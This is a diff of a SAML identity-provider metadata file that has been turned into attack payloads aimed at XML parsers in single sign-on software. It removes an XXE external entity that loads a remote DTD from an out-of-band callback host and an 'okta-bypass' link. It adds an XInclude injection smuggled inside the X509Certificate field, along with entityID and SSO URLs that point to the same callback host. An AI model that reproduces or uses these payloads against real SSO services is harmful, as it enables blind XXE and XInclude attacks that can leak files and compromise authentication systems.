@@ -1,17 +1,15 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE md:EntityDescriptor [
-  <!ENTITY % remote SYSTEM "https://b8df73e81a46ec95041bg16z11eyyyyyb.oast.pro/XXE_EXPLOIT_ACTIVE">
-  %remote;
-]>
-<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" entityID="https://bit.ly/okta-bypass">
+<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://b8df73e81a46ec95041bg16z11eyyyyyb.oast.pro/ENTITY_ID_HIT">
   <md:IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
     <md:KeyDescriptor use="signing">
-      <ds:KeyInfo>
+      <ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
         <ds:X509Data>
-          <ds:X509Certificate>MIIDBTCCAe2gAwIBAgIQYn8N2p6p6p6p6p6p6p6p6pANBgkqhkiG9w0BAQsFADAA</ds:X509Certificate>
+          <ds:X509Certificate>
+            " id="xxe" xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://b8df73e81a46ec95041bg16z11eyyyyyb.oast.pro/XINCLUDE_HIT"/>
+          </ds:X509Certificate>
         </ds:X509Data>
       </ds:KeyInfo>
     </md:KeyDescriptor>
-    <md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://b8df73e81a46ec95041bg16z11eyyyyyb.oast.pro/sso"/>
+    <md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://b8df73e81a46ec95041bg16z11eyyyyyb.oast.pro/SSO_HIT"/>
   </md:IDPSSODescriptor>
 </md:EntityDescriptor>
